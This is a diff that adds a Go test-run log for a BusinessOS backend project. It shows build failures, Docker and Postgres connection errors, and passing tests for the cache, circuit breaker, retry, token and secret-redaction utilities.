@@ -1,0 +1,2405 @@
+# github.com/rhl/businessos-backend/internal/services
+internal\services\osa_queue_worker.go:304:19: w.buildGenerationPrompt undefined (type *OSAQueueWorker has no field or method buildGenerationPrompt)
+internal\services\osa_queue_worker.go:314:27: request.TemplateID undefined (type *osa.AppGenerationRequest has no field or method TemplateID)
+internal\services\osa_queue_worker.go:318:49: too many arguments in call to client.GenerateApp
+	have (context.Context, unknown type, map[string]interface{})
+	want (context.Context, *osa.AppGenerationRequest)
+internal\services\osa_queue_worker.go:330:29: result.AppID.String undefined (type string has no field or method String)
+internal\services\osa_queue_worker.go:333:70: result.Name undefined (type *osa.AppGenerationResponse has no field or method Name)
+internal\services\osa_queue_worker.go:336:27: result.Name undefined (type *osa.AppGenerationResponse has no field or method Name)
+internal\services\osa_queue_worker.go:337:27: result.Description undefined (type *osa.AppGenerationResponse has no field or method Description)
+internal\services\osa_queue_worker.go:338:27: result.CodeBundle undefined (type *osa.AppGenerationResponse has no field or method CodeBundle)
+internal\services\osa_queue_worker.go:339:27: result.Metadata undefined (type *osa.AppGenerationResponse has no field or method Metadata)
+internal\services\osa_queue_worker.go:345:22: result.Name undefined (type *osa.AppGenerationResponse has no field or method Name)
+internal\services\osa_queue_worker.go:345:22: too many errors
+FAIL	github.com/rhl/businessos-backend/cmd/reembed [build failed]
+FAIL	github.com/rhl/businessos-backend/cmd/server [build failed]
+FAIL	github.com/rhl/businessos-backend/cmd/summarize [build failed]
+FAIL	github.com/rhl/businessos-backend/cmd/sync-templates [build failed]
+=== RUN   TestDockerClientImport
+    docker_test.go:26: Note: Could not ping Docker daemon (this is expected if Docker isn't running): error during connect: in the default daemon configuration on Windows, the docker client must be run with elevated privileges to connect: Head "http://%2F%2F.%2Fpipe%2Fdocker_engine/_ping": open //./pipe/docker_engine: O sistema nÃ£o pode encontrar o arquivo especificado.
+--- PASS: TestDockerClientImport (0.00s)
+PASS
+ok  	github.com/rhl/businessos-backend/examples	(cached)
+FAIL	github.com/rhl/businessos-backend/examples/smart_chunking [build failed]
+FAIL	github.com/rhl/businessos-backend/internal/agents [build failed]
+FAIL	github.com/rhl/businessos-backend/internal/agents/analyst [build failed]
+FAIL	github.com/rhl/businessos-backend/internal/agents/client [build failed]
+FAIL	github.com/rhl/businessos-backend/internal/agents/document [build failed]
+FAIL	github.com/rhl/businessos-backend/internal/agents/project [build failed]
+FAIL	github.com/rhl/businessos-backend/internal/agents/task [build failed]
+=== RUN   TestConversationHistoryCaching
+--- PASS: TestConversationHistoryCaching (0.02s)
+=== RUN   TestEmbeddingCaching
+--- PASS: TestEmbeddingCaching (0.01s)
+=== RUN   TestAgentStatusCaching
+--- PASS: TestAgentStatusCaching (0.00s)
+=== RUN   TestArtifactListCaching
+--- PASS: TestArtifactListCaching (0.01s)
+=== RUN   TestGenericCaching
+--- PASS: TestGenericCaching (0.01s)
+=== RUN   TestCacheStats
+--- PASS: TestCacheStats (0.01s)
+=== RUN   TestCachePing
+--- PASS: TestCachePing (0.00s)
+=== RUN   TestCacheFlush
+time=2026-01-27T10:35:26.626-03:00 level=ERROR msg="CRITICAL: Flushing entire Redis database" timestamp=2026-01-27T10:35:26.626-03:00 operation=FlushDB
+--- PASS: TestCacheFlush (0.00s)
+=== RUN   TestHashDeterminism
+--- PASS: TestHashDeterminism (0.00s)
+=== RUN   TestQueryCacheDelete
+--- PASS: TestQueryCacheDelete (0.00s)
+=== RUN   TestQueryCacheDeleteByPattern
+--- PASS: TestQueryCacheDeleteByPattern (0.01s)
+=== RUN   TestQueryCacheMDel
+--- PASS: TestQueryCacheMDel (0.01s)
+=== RUN   TestQueryCacheMDelEmpty
+--- PASS: TestQueryCacheMDelEmpty (0.00s)
+PASS
+ok  	github.com/rhl/businessos-backend/internal/cache	(cached)
+?   	github.com/rhl/businessos-backend/internal/config	[no test files]
+=== RUN   TestNewContainerManager
+2026/01/27 10:20:04 [Container] Creating new container manager with image: 
+    manager_test.go:15: Docker not available: Docker daemon not available: error during connect: in the default daemon configuration on Windows, the docker client must be run with elevated privileges to connect: Head "http://%2F%2F.%2Fpipe%2Fdocker_engine/_ping": open //./pipe/docker_engine: O sistema nÃ£o pode encontrar o arquivo especificado.
+--- SKIP: TestNewContainerManager (0.02s)
+=== RUN   TestNewContainerManagerWithCustomImage
+2026/01/27 10:20:04 [Container] Creating new container manager with image: alpine:latest
+    manager_test.go:45: Docker not available: Docker daemon not available: error during connect: in the default daemon configuration on Windows, the docker client must be run with elevated privileges to connect: Head "http://%2F%2F.%2Fpipe%2Fdocker_engine/_ping": open //./pipe/docker_engine: O sistema nÃ£o pode encontrar o arquivo especificado.
+--- SKIP: TestNewContainerManagerWithCustomImage (0.00s)
+=== RUN   TestContainerManagerClose
+2026/01/27 10:20:04 [Container] Creating new container manager with image: 
+    manager_test.go:60: Docker not available: Docker daemon not available: error during connect: in the default daemon configuration on Windows, the docker client must be run with elevated privileges to connect: Head "http://%2F%2F.%2Fpipe%2Fdocker_engine/_ping": open //./pipe/docker_engine: O sistema nÃ£o pode encontrar o arquivo especificado.
+--- SKIP: TestContainerManagerClose (0.00s)
+=== RUN   TestListContainers
+2026/01/27 10:20:04 [Container] Creating new container manager with image: 
+    manager_test.go:78: Docker not available: Docker daemon not available: error during connect: in the default daemon configuration on Windows, the docker client must be run with elevated privileges to connect: Head "http://%2F%2F.%2Fpipe%2Fdocker_engine/_ping": open //./pipe/docker_engine: O sistema nÃ£o pode encontrar o arquivo especificado.
+--- SKIP: TestListContainers (0.00s)
+=== RUN   TestUpdateActivity
+2026/01/27 10:20:04 [Container] Creating new container manager with image: 
+    manager_test.go:125: Docker not available: Docker daemon not available: error during connect: in the default daemon configuration on Windows, the docker client must be run with elevated privileges to connect: Head "http://%2F%2F.%2Fpipe%2Fdocker_engine/_ping": open //./pipe/docker_engine: O sistema nÃ£o pode encontrar o arquivo especificado.
+--- SKIP: TestUpdateActivity (0.00s)
+=== RUN   TestCleanupOrphans_RaceCondition
+2026/01/27 10:20:04 [Container] Creating new container manager with image: ubuntu:22.04
+    monitor_race_test.go:27: Failed to create container manager (Docker not available): Docker daemon not available: error during connect: in the default daemon configuration on Windows, the docker client must be run with elevated privileges to connect: Head "http://%2F%2F.%2Fpipe%2Fdocker_engine/_ping": open //./pipe/docker_engine: O sistema nÃ£o pode encontrar o arquivo especificado.
+--- SKIP: TestCleanupOrphans_RaceCondition (0.00s)
+=== RUN   TestMonitor_ConcurrentStatsAccess
+    monitor_race_test.go:173: Final container count: 177
+    monitor_race_test.go:179: Total started: 2000, Total stopped: 1000
+--- PASS: TestMonitor_ConcurrentStatsAccess (0.17s)
+=== RUN   TestMonitor_CleanupLoopRaceCondition
+2026/01/27 10:20:04 [Container] Creating new container manager with image: ubuntu:22.04
+    monitor_race_test.go:200: Failed to create container manager (Docker not available): Docker daemon not available: error during connect: in the default daemon configuration on Windows, the docker client must be run with elevated privileges to connect: Head "http://%2F%2F.%2Fpipe%2Fdocker_engine/_ping": open //./pipe/docker_engine: O sistema nÃ£o pode encontrar o arquivo especificado.
+--- SKIP: TestMonitor_CleanupLoopRaceCondition (0.00s)
+=== RUN   TestMonitor_MetricsAtomicity
+    monitor_race_test.go:316: Atomicity test passed: 100000 operations per metric type
+--- PASS: TestMonitor_MetricsAtomicity (0.00s)
+=== RUN   TestMonitor_UpdateContainerStats_Concurrency
+    monitor_race_test.go:364: Concurrent updateContainerStats completed successfully
+--- PASS: TestMonitor_UpdateContainerStats_Concurrency (0.00s)
+=== RUN   TestCleanupOrphans_UnlockRelockPattern
+2026/01/27 10:20:04 [Container] Creating new container manager with image: ubuntu:22.04
+    monitor_race_test.go:384: Failed to create container manager (Docker not available): Docker daemon not available: error during connect: in the default daemon configuration on Windows, the docker client must be run with elevated privileges to connect: Head "http://%2F%2F.%2Fpipe%2Fdocker_engine/_ping": open //./pipe/docker_engine: O sistema nÃ£o pode encontrar o arquivo especificado.
+--- SKIP: TestCleanupOrphans_UnlockRelockPattern (0.00s)
+=== RUN   TestDefaultMonitorConfig
+--- PASS: TestDefaultMonitorConfig (0.00s)
+=== RUN   TestNewContainerMetrics
+--- PASS: TestNewContainerMetrics (0.00s)
+=== RUN   TestContainerMetrics_AtomicOperations
+--- PASS: TestContainerMetrics_AtomicOperations (0.00s)
+=== RUN   TestContainerMetrics_ToJSON
+--- PASS: TestContainerMetrics_ToJSON (0.00s)
+=== RUN   TestContainerStats_Creation
+--- PASS: TestContainerStats_Creation (0.00s)
+=== RUN   TestContainerMonitor_RegisterUnregister
+--- PASS: TestContainerMonitor_RegisterUnregister (0.00s)
+=== RUN   TestContainerMonitor_UpdateActivity
+--- PASS: TestContainerMonitor_UpdateActivity (0.00s)
+=== RUN   TestContainerMonitor_GetAllContainerStats
+--- PASS: TestContainerMonitor_GetAllContainerStats (0.00s)
+=== RUN   TestContainerMonitor_GetContainerStats
+--- PASS: TestContainerMonitor_GetContainerStats (0.00s)
+=== RUN   TestContainerMonitor_IdleDetection
+--- PASS: TestContainerMonitor_IdleDetection (0.00s)
+=== RUN   TestGetVolumeName
+=== RUN   TestGetVolumeName/standard_user_ID
+=== RUN   TestGetVolumeName/UUID_user_ID
+=== RUN   TestGetVolumeName/numeric_user_ID
+--- PASS: TestGetVolumeName (0.00s)
+    --- PASS: TestGetVolumeName/standard_user_ID (0.00s)
+    --- PASS: TestGetVolumeName/UUID_user_ID (0.00s)
+    --- PASS: TestGetVolumeName/numeric_user_ID (0.00s)
+=== RUN   TestCreateVolumeValidation
+--- PASS: TestCreateVolumeValidation (0.00s)
+=== RUN   TestRemoveVolumeValidation
+--- PASS: TestRemoveVolumeValidation (0.00s)
+=== RUN   TestVolumeExistsValidation
+--- PASS: TestVolumeExistsValidation (0.00s)
+=== RUN   TestListUserVolumesValidation
+--- PASS: TestListUserVolumesValidation (0.00s)
+=== RUN   TestGetVolumeInfoValidation
+--- PASS: TestGetVolumeInfoValidation (0.00s)
+PASS
+ok  	github.com/rhl/businessos-backend/internal/container	(cached)
+=== RUN   TestMigrationRollback
+    containers.go:229: 
+        	Error Trace:	C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/testutil/containers.go:229
+        	            				C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/database/migrations_test.go:26
+        	Error:      	Received unexpected error:
+        	            	failed to ping database: failed to connect to `user=postgres database=businessos_test`: [::1]:5432 (localhost): failed SASL auth: FATAL: autenticação do tipo senha falhou para o usuário "postgres" (SQLSTATE 28P01) (ensure TEST_DATABASE_URL is set or test database is running)
+        	Test:       	TestMigrationRollback
+        	Messages:   	Failed to setup test database
+--- FAIL: TestMigrationRollback (0.46s)
+=== RUN   TestMigrationRollbackOrder
+    containers.go:229: 
+        	Error Trace:	C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/testutil/containers.go:229
+        	            				C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/database/migrations_test.go:88
+        	Error:      	Received unexpected error:
+        	            	failed to ping database: failed to connect to `user=postgres database=businessos_test`: [::1]:5432 (localhost): failed SASL auth: FATAL: autenticação do tipo senha falhou para o usuário "postgres" (SQLSTATE 28P01) (ensure TEST_DATABASE_URL is set or test database is running)
+        	Test:       	TestMigrationRollbackOrder
+        	Messages:   	Failed to setup test database
+--- FAIL: TestMigrationRollbackOrder (0.05s)
+=== RUN   TestPartialMigrationFailure
+    containers.go:229: 
+        	Error Trace:	C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/testutil/containers.go:229
+        	            				C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/database/migrations_test.go:145
+        	Error:      	Received unexpected error:
+        	            	failed to ping database: failed to connect to `user=postgres database=businessos_test`: [::1]:5432 (localhost): failed SASL auth: FATAL: autenticação do tipo senha falhou para o usuário "postgres" (SQLSTATE 28P01) (ensure TEST_DATABASE_URL is set or test database is running)
+        	Test:       	TestPartialMigrationFailure
+        	Messages:   	Failed to setup test database
+--- FAIL: TestPartialMigrationFailure (0.04s)
+=== RUN   TestMigrationIdempotency
+    containers.go:229: 
+        	Error Trace:	C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/testutil/containers.go:229
+        	            				C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/database/migrations_test.go:195
+        	Error:      	Received unexpected error:
+        	            	failed to ping database: failed to connect to `user=postgres database=businessos_test`: [::1]:5432 (localhost): failed SASL auth: FATAL: autenticação do tipo senha falhou para o usuário "postgres" (SQLSTATE 28P01) (ensure TEST_DATABASE_URL is set or test database is running)
+        	Test:       	TestMigrationIdempotency
+        	Messages:   	Failed to setup test database
+--- FAIL: TestMigrationIdempotency (0.04s)
+=== RUN   TestMigrationRollbackDataIntegrity
+    containers.go:229: 
+        	Error Trace:	C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/testutil/containers.go:229
+        	            				C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/database/migrations_test.go:240
+        	Error:      	Received unexpected error:
+        	            	failed to ping database: failed to connect to `user=postgres database=businessos_test`: [::1]:5432 (localhost): failed SASL auth: FATAL: autenticação do tipo senha falhou para o usuário "postgres" (SQLSTATE 28P01) (ensure TEST_DATABASE_URL is set or test database is running)
+        	Test:       	TestMigrationRollbackDataIntegrity
+        	Messages:   	Failed to setup test database
+--- FAIL: TestMigrationRollbackDataIntegrity (0.04s)
+=== RUN   TestSchemaVersionTracking
+    containers.go:229: 
+        	Error Trace:	C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/testutil/containers.go:229
+        	            				C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/database/migrations_test.go:326
+        	Error:      	Received unexpected error:
+        	            	failed to ping database: failed to connect to `user=postgres database=businessos_test`: [::1]:5432 (localhost): failed SASL auth: FATAL: autenticação do tipo senha falhou para o usuário "postgres" (SQLSTATE 28P01) (ensure TEST_DATABASE_URL is set or test database is running)
+        	Test:       	TestSchemaVersionTracking
+        	Messages:   	Failed to setup test database
+--- FAIL: TestSchemaVersionTracking (0.04s)
+=== RUN   TestForeignKeyConstraintsDuringRollback
+    containers.go:229: 
+        	Error Trace:	C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/testutil/containers.go:229
+        	            				C:/Users/Pichau/Desktop/BusinessOS-main-dev/desktop/backend-go/internal/database/migrations_test.go:379
+        	Error:      	Received unexpected error:
+        	            	failed to ping database: failed to connect to `user=postgres database=businessos_test`: [::1]:5432 (localhost): failed SASL auth: FATAL: autenticação do tipo senha falhou para o usuário "postgres" (SQLSTATE 28P01) (ensure TEST_DATABASE_URL is set or test database is running)
+        	Test:       	TestForeignKeyConstraintsDuringRollback
+        	Messages:   	Failed to setup test database
+--- FAIL: TestForeignKeyConstraintsDuringRollback (0.03s)
+FAIL
+FAIL	github.com/rhl/businessos-backend/internal/database	0.985s
+?   	github.com/rhl/businessos-backend/internal/database/sqlc	[no test files]
+FAIL	github.com/rhl/businessos-backend/internal/handlers [build failed]
+?   	github.com/rhl/businessos-backend/internal/integrations	[no test files]
+?   	github.com/rhl/businessos-backend/internal/integrations/airtable	[no test files]
+?   	github.com/rhl/businessos-backend/internal/integrations/clickup	[no test files]
+FAIL	github.com/rhl/businessos-backend/internal/integrations/fathom [build failed]
+?   	github.com/rhl/businessos-backend/internal/integrations/google	[no test files]
+FAIL	github.com/rhl/businessos-backend/internal/integrations/hubspot [build failed]
+FAIL	github.com/rhl/businessos-backend/internal/integrations/linear [build failed]
+?   	github.com/rhl/businessos-backend/internal/integrations/microsoft	[no test files]
+?   	github.com/rhl/businessos-backend/internal/integrations/notion	[no test files]
+=== RUN   TestGenerateAuthToken
+=== RUN   TestGenerateAuthToken/with_workspace_ID
+=== RUN   TestGenerateAuthToken/without_workspace_ID
+--- PASS: TestGenerateAuthToken (0.00s)
+    --- PASS: TestGenerateAuthToken/with_workspace_ID (0.00s)
+    --- PASS: TestGenerateAuthToken/without_workspace_ID (0.00s)
+=== RUN   TestValidateAuthToken
+=== RUN   TestValidateAuthToken/valid_token
+=== RUN   TestValidateAuthToken/invalid_token_-_wrong_secret
+=== RUN   TestValidateAuthToken/invalid_token_-_malformed
+=== RUN   TestValidateAuthToken/invalid_token_-_expired
+=== RUN   TestValidateAuthToken/invalid_token_-_wrong_signing_method
+--- PASS: TestValidateAuthToken (0.00s)
+    --- PASS: TestValidateAuthToken/valid_token (0.00s)
+    --- PASS: TestValidateAuthToken/invalid_token_-_wrong_secret (0.00s)
+    --- PASS: TestValidateAuthToken/invalid_token_-_malformed (0.00s)
+    --- PASS: TestValidateAuthToken/invalid_token_-_expired (0.00s)
+    --- PASS: TestValidateAuthToken/invalid_token_-_wrong_signing_method (0.00s)
+=== RUN   TestTokenExpiration
+--- PASS: TestTokenExpiration (0.00s)
+=== RUN   TestTokenIssuerAndSubject
+--- PASS: TestTokenIssuerAndSubject (0.00s)
+=== RUN   TestResilientClientCircuitBreaker
+=== RUN   TestResilientClientCircuitBreaker/Circuit_opens_after_threshold_failures
+2026/01/27 10:20:32 ERROR generate app failed after retries error="failed to generate app: API request failed with status 500: " circuit_state=closed
+2026/01/27 10:20:32 INFO applying fallback strategy for app generation strategy=0
+2026/01/27 10:20:32 ERROR generate app failed after retries error="failed to generate app: API request failed with status 500: " circuit_state=closed
+2026/01/27 10:20:32 INFO applying fallback strategy for app generation strategy=0
+2026/01/27 10:20:32 ERROR generate app failed after retries error="failed to generate app: API request failed with status 500: " circuit_state=closed
+2026/01/27 10:20:32 INFO applying fallback strategy for app generation strategy=0
+2026/01/27 10:20:32 ERROR generate app failed after retries error="failed to generate app: API request failed with status 500: " circuit_state=closed
+2026/01/27 10:20:32 INFO applying fallback strategy for app generation strategy=0
+2026/01/27 10:20:32 INFO circuit breaker state change old_state=closed new_state=open failures=5 consecutive_successes=0
+2026/01/27 10:20:32 ERROR generate app failed after retries error="failed to generate app: API request failed with status 500: " circuit_state=open
+2026/01/27 10:20:32 INFO applying fallback strategy for app generation strategy=0
+2026/01/27 10:20:32 ERROR failed to queue request error="queue is full (max: 0)"
+2026/01/27 10:20:32 ERROR generate app failed after retries error="circuit breaker is open (state: open, next attempt: 2026-01-27T10:21:02-03:00)" circuit_state=open
+2026/01/27 10:20:32 INFO applying fallback strategy for app generation strategy=0
+2026/01/27 10:20:32 ERROR failed to queue request error="queue is full (max: 0)"
+=== RUN   TestResilientClientCircuitBreaker/Circuit_half-opens_and_closes_on_success
+2026/01/27 10:20:32 ERROR generate app failed after retries error="failed to generate app: API request failed with status 500: " circuit_state=closed
+2026/01/27 10:20:32 INFO applying fallback strategy for app generation strategy=0
+2026/01/27 10:20:32 ERROR generate app failed after retries error="failed to generate app: API request failed with status 500: " circuit_state=closed
+2026/01/27 10:20:32 INFO applying fallback strategy for app generation strategy=0
+2026/01/27 10:20:32 ERROR generate app failed after retries error="failed to generate app: API request failed with status 500: " circuit_state=closed
+2026/01/27 10:20:32 INFO applying fallback strategy for app generation strategy=0
+--- PASS: TestResilientClientCircuitBreaker (1.53s)
+    --- PASS: TestResilientClientCircuitBreaker/Circuit_opens_after_threshold_failures (0.03s)
+    --- PASS: TestResilientClientCircuitBreaker/Circuit_half-opens_and_closes_on_success (1.50s)
+=== RUN   TestResilientClientRetryLogic
+=== RUN   TestResilientClientRetryLogic/Retry_with_exponential_backoff
+=== RUN   TestResilientClientRetryLogic/Max_retries_exhausted
+2026/01/27 10:20:37 ERROR generate app failed after retries error="failed to generate app: API request failed with status 500: " circuit_state=closed
+2026/01/27 10:20:37 INFO applying fallback strategy for app generation strategy=0
+--- PASS: TestResilientClientRetryLogic (2.92s)
+    --- PASS: TestResilientClientRetryLogic/Retry_with_exponential_backoff (1.26s)
+    --- PASS: TestResilientClientRetryLogic/Max_retries_exhausted (1.66s)
+=== RUN   TestResilientClientHealthCheck
+=== RUN   TestResilientClientHealthCheck/Health_check_is_cached
+--- PASS: TestResilientClientHealthCheck (2.00s)
+    --- PASS: TestResilientClientHealthCheck/Health_check_is_cached (2.00s)
+=== RUN   TestResilientClientConcurrency
+=== RUN   TestResilientClientConcurrency/Handle_concurrent_requests_safely
+--- PASS: TestResilientClientConcurrency (0.00s)
+    --- PASS: TestResilientClientConcurrency/Handle_concurrent_requests_safely (0.00s)
+=== RUN   TestResilientClientTimeout
+=== RUN   TestResilientClientTimeout/Request_times_out_after_configured_duration
+2026/01/27 10:20:39 ERROR generate app failed after retries error="failed to generate app: request failed after 0 retries: Post \"http://127.0.0.1:62294/api/orchestrate\": context deadline exceeded (Client.Timeout exceeded while awaiting headers)" circuit_state=closed
+2026/01/27 10:20:39 INFO applying fallback strategy for app generation strategy=0
+--- PASS: TestResilientClientTimeout (3.00s)
+    --- PASS: TestResilientClientTimeout/Request_times_out_after_configured_duration (3.00s)
+=== RUN   TestResilientClientContextCancellation
+=== RUN   TestResilientClientContextCancellation/Request_cancelled_via_context
+2026/01/27 10:20:42 ERROR generate app failed after retries error="failed to generate app: request failed after 0 retries: Post \"http://127.0.0.1:62434/api/orchestrate\": context deadline exceeded" circuit_state=closed
+2026/01/27 10:20:42 INFO applying fallback strategy for app generation strategy=0
+--- PASS: TestResilientClientContextCancellation (5.00s)
+    --- PASS: TestResilientClientContextCancellation/Request_cancelled_via_context (5.00s)
+=== RUN   TestNewClient
+=== RUN   TestNewClient/valid_config
+=== RUN   TestNewClient/missing_base_URL
+=== RUN   TestNewClient/missing_shared_secret
+--- PASS: TestNewClient (0.00s)
+    --- PASS: TestNewClient/valid_config (0.00s)
+    --- PASS: TestNewClient/missing_base_URL (0.00s)
+    --- PASS: TestNewClient/missing_shared_secret (0.00s)
+=== RUN   TestClient_HealthCheck
+--- PASS: TestClient_HealthCheck (0.00s)
+=== RUN   TestClient_GenerateApp
+--- PASS: TestClient_GenerateApp (0.00s)
+=== RUN   TestClient_GetAppStatus
+--- PASS: TestClient_GetAppStatus (0.00s)
+=== RUN   TestClient_Orchestrate
+--- PASS: TestClient_Orchestrate (0.00s)
+=== RUN   TestClient_GetWorkspaces
+--- PASS: TestClient_GetWorkspaces (0.00s)
+=== RUN   TestClient_ErrorHandling
+--- PASS: TestClient_ErrorHandling (0.00s)
+=== RUN   TestClient_HTTPErrorNoRetry
+--- PASS: TestClient_HTTPErrorNoRetry (0.00s)
+=== RUN   TestCircuitBreaker
+=== RUN   TestCircuitBreaker/starts_in_closed_state
+=== RUN   TestCircuitBreaker/opens_after_max_failures
+2026/01/27 10:20:47 INFO circuit breaker state change old_state=closed new_state=open failures=3 consecutive_successes=0
+=== RUN   TestCircuitBreaker/rejects_requests_when_open
+2026/01/27 10:20:47 INFO circuit breaker state change old_state=closed new_state=open failures=2 consecutive_successes=0
+=== RUN   TestCircuitBreaker/transitions_to_half-open_after_timeout
+2026/01/27 10:20:47 INFO circuit breaker state change old_state=closed new_state=open failures=2 consecutive_successes=0
+2026/01/27 10:20:47 INFO circuit breaker state change old_state=open new_state=half-open failures=2 consecutive_successes=0
+=== RUN   TestCircuitBreaker/closes_after_successful_half-open_requests
+2026/01/27 10:20:47 INFO circuit breaker state change old_state=closed new_state=open failures=2 consecutive_successes=0
+2026/01/27 10:20:47 INFO circuit breaker state change old_state=open new_state=half-open failures=2 consecutive_successes=0
+2026/01/27 10:20:47 INFO circuit breaker state change old_state=half-open new_state=closed failures=2 consecutive_successes=2
+=== RUN   TestCircuitBreaker/reopens_on_failure_in_half-open_state
+2026/01/27 10:20:47 INFO circuit breaker state change old_state=closed new_state=open failures=2 consecutive_successes=0
+2026/01/27 10:20:47 INFO circuit breaker state change old_state=open new_state=half-open failures=2 consecutive_successes=0
+2026/01/27 10:20:47 INFO circuit breaker state change old_state=half-open new_state=open failures=3 consecutive_successes=0
+=== RUN   TestCircuitBreaker/tracks_metrics_correctly
+--- PASS: TestCircuitBreaker (0.18s)
+    --- PASS: TestCircuitBreaker/starts_in_closed_state (0.00s)
+    --- PASS: TestCircuitBreaker/opens_after_max_failures (0.00s)
+    --- PASS: TestCircuitBreaker/rejects_requests_when_open (0.00s)
+    --- PASS: TestCircuitBreaker/transitions_to_half-open_after_timeout (0.06s)
+    --- PASS: TestCircuitBreaker/closes_after_successful_half-open_requests (0.06s)
+    --- PASS: TestCircuitBreaker/reopens_on_failure_in_half-open_state (0.06s)
+    --- PASS: TestCircuitBreaker/tracks_metrics_correctly (0.00s)
+=== RUN   TestRetryWithBackoff
+=== RUN   TestRetryWithBackoff/succeeds_on_first_try
+=== RUN   TestRetryWithBackoff/retries_on_retryable_errors
+=== RUN   TestRetryWithBackoff/stops_on_non-retryable_errors
+=== RUN   TestRetryWithBackoff/respects_context_cancellation
+--- PASS: TestRetryWithBackoff (1.54s)
+    --- PASS: TestRetryWithBackoff/succeeds_on_first_try (0.00s)
+    --- PASS: TestRetryWithBackoff/retries_on_retryable_errors (1.54s)
+    --- PASS: TestRetryWithBackoff/stops_on_non-retryable_errors (0.00s)
+    --- PASS: TestRetryWithBackoff/respects_context_cancellation (0.00s)
+=== RUN   TestIsRetryableError
+=== RUN   TestIsRetryableError/nil_error
+=== RUN   TestIsRetryableError/timeout_error
+=== RUN   TestIsRetryableError/503_error
+=== RUN   TestIsRetryableError/500_error
+=== RUN   TestIsRetryableError/429_rate_limit
+=== RUN   TestIsRetryableError/connection_refused
+=== RUN   TestIsRetryableError/400_bad_request
+=== RUN   TestIsRetryableError/404_not_found
+=== RUN   TestIsRetryableError/generic_error
+--- PASS: TestIsRetryableError (0.00s)
+    --- PASS: TestIsRetryableError/nil_error (0.00s)
+    --- PASS: TestIsRetryableError/timeout_error (0.00s)
+    --- PASS: TestIsRetryableError/503_error (0.00s)
+    --- PASS: TestIsRetryableError/500_error (0.00s)
+    --- PASS: TestIsRetryableError/429_rate_limit (0.00s)
+    --- PASS: TestIsRetryableError/connection_refused (0.00s)
+    --- PASS: TestIsRetryableError/400_bad_request (0.00s)
+    --- PASS: TestIsRetryableError/404_not_found (0.00s)
+    --- PASS: TestIsRetryableError/generic_error (0.00s)
+=== RUN   TestHealthCheckCache
+=== RUN   TestHealthCheckCache/caches_health_check_results
+=== RUN   TestHealthCheckCache/refreshes_after_TTL_expires
+=== RUN   TestHealthCheckCache/invalidate_clears_cache
+--- PASS: TestHealthCheckCache (0.06s)
+    --- PASS: TestHealthCheckCache/caches_health_check_results (0.00s)
+    --- PASS: TestHealthCheckCache/refreshes_after_TTL_expires (0.06s)
+    --- PASS: TestHealthCheckCache/invalidate_clears_cache (0.00s)
+PASS
+ok  	github.com/rhl/businessos-backend/internal/integrations/osa	(cached)
+FAIL	github.com/rhl/businessos-backend/internal/integrations/providers [build failed]
+?   	github.com/rhl/businessos-backend/internal/integrations/slack	[no test files]
+=== RUN   TestMaskEmail
+=== RUN   TestMaskEmail/Normal_email
+=== RUN   TestMaskEmail/Single_char_email
+=== RUN   TestMaskEmail/Empty_email
+=== RUN   TestMaskEmail/Invalid_email
+=== RUN   TestMaskEmail/Long_email
+--- PASS: TestMaskEmail (0.00s)
+    --- PASS: TestMaskEmail/Normal_email (0.00s)
+    --- PASS: TestMaskEmail/Single_char_email (0.00s)
+    --- PASS: TestMaskEmail/Empty_email (0.00s)
+    --- PASS: TestMaskEmail/Invalid_email (0.00s)
+    --- PASS: TestMaskEmail/Long_email (0.00s)
+=== RUN   TestMaskToken
+=== RUN   TestMaskToken/JWT_token
+=== RUN   TestMaskToken/Bearer_token
+=== RUN   TestMaskToken/Long_token
+=== RUN   TestMaskToken/Short_token
+=== RUN   TestMaskToken/Empty_token
+--- PASS: TestMaskToken (0.00s)
+    --- PASS: TestMaskToken/JWT_token (0.00s)
+    --- PASS: TestMaskToken/Bearer_token (0.00s)
+    --- PASS: TestMaskToken/Long_token (0.00s)
+    --- PASS: TestMaskToken/Short_token (0.00s)
+    --- PASS: TestMaskToken/Empty_token (0.00s)
+=== RUN   TestDetectAndRedactSecrets
+=== RUN   TestDetectAndRedactSecrets/AWS_access_key
+=== RUN   TestDetectAndRedactSecrets/GitHub_PAT
+=== RUN   TestDetectAndRedactSecrets/JWT_in_text
+=== RUN   TestDetectAndRedactSecrets/API_key_in_assignment
+=== RUN   TestDetectAndRedactSecrets/Normal_text
+=== RUN   TestDetectAndRedactSecrets/Private_key_header
+--- PASS: TestDetectAndRedactSecrets (0.00s)
+    --- PASS: TestDetectAndRedactSecrets/AWS_access_key (0.00s)
+    --- PASS: TestDetectAndRedactSecrets/GitHub_PAT (0.00s)
+    --- PASS: TestDetectAndRedactSecrets/JWT_in_text (0.00s)
+    --- PASS: TestDetectAndRedactSecrets/API_key_in_assignment (0.00s)
+    --- PASS: TestDetectAndRedactSecrets/Normal_text (0.00s)
+    --- PASS: TestDetectAndRedactSecrets/Private_key_header (0.00s)
+=== RUN   TestSanitizeSQL
+=== RUN   TestSanitizeSQL/String_literal
+=== RUN   TestSanitizeSQL/Token_in_WHERE
+=== RUN   TestSanitizeSQL/Safe_query
+--- PASS: TestSanitizeSQL (0.00s)
+    --- PASS: TestSanitizeSQL/String_literal (0.00s)
+    --- PASS: TestSanitizeSQL/Token_in_WHERE (0.00s)
+    --- PASS: TestSanitizeSQL/Safe_query (0.00s)
+=== RUN   TestSanitizeURL
+=== RUN   TestSanitizeURL/URL_with_query_params
+=== RUN   TestSanitizeURL/URL_with_session_in_path
+=== RUN   TestSanitizeURL/Safe_URL
+--- PASS: TestSanitizeURL (0.00s)
+    --- PASS: TestSanitizeURL/URL_with_query_params (0.00s)
+    --- PASS: TestSanitizeURL/URL_with_session_in_path (0.00s)
+    --- PASS: TestSanitizeURL/Safe_URL (0.00s)
